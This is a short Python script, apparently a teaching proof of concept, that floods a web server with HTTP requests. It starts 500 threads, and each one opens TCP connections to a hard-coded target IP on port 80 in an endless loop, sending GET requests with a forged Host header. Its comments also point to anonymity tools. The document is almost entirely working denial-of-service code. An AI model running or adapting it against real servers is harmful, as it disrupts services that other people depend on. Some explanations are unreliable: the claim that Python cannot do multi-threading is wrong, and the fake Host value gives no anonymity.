"""In this program we will show and example of the premice of a DDOS attack, DDOS attacks are cyberattacks that attempt to flood a server with more connections that it can handle.
Due to this program being written in Python and the configuration of the program it is not destructive enough to completely deny a user access or slow a users connection on an average
internet connection. However the proof of concept can be seen by observing internet traffic through a program like WireShark."""

import threading
import socket

#Selecting our target IP address
target = '172.0.0.1'

#Select the port we want to deny service (In this case HTTP)
port = 80

#Select a false IP address to attach to the HTTP header (This will not make you anonomous, must be used in conjunction with ammeninity tools)
fakeip = '182.21.20.32'

#Method that launches the attack, essentially a infinite loop that make HTTP Get request, then host request, then closes the socket
def attack():

    #Makes the loop infinite
    while True:

        #Establishing our socket (AF_INET is declaring this as an internet socket, SOCK_STREAM is for TCP connections)
        mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Connecting to the socket with our target IP and port
        mySocket.connect((target, port))


        #Sends a GET request to target IP through HTTP 1.1, encodes the request and sends it to our target IP and port
        mySocket.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))

        #Sends a Host request to target IP through HTTP 1.1, encodes the request and sends it to our target IP and port
        mySocket.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'), (target, port))

        #Close our socket
        mySocket.close()


#For loop that will emulate multi-threading (Python does not support multi-threading, rather will try its best to emulate it)
for i in range(500):

    #Establishing our Thread, setting the target of our multi-threading to be the attack method
    thread = threading.Thread(target=attack)

    #Execute our thread
    thread.start()
